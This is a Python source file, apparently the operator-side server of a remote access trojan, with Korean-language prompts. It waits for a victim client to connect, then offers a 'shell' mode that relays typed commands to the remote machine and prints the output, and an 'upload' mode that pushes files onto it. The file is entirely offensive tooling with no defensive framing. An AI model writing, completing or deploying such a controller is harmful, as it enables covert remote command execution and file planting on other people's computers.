import socket, os

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] 클라이언트를 기다립니다")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] 연결이 성공적으로 설정되었습니다. {ipcli}")
        print()

    def banner(self):
        print("banner")
    def execute(self):
        self.banner()
        while True:
            global command
            command = input('명령어 >>  ')

            if command == 'shell':
                client.send(command.encode())
                while 1:
                    command = str(input('>> '))
                    client.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = client.recv(1024).decode()
                    print(result_output)
                client.close()
                s.close()

            elif command == 'upload':
                client.send(command.encode())
                file = str(input('파일의 파일 경로를 입력하십시오 : '))
                filename = str(input("출력 파일의 파일 경로를 입력하십시오 : "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("파일이 전송되었습니다")
                client.send(filedata)






rat_server = RAT_SERVER("127.0.0.1", 12345)

rat_server.build_connection()

rat_server.execute()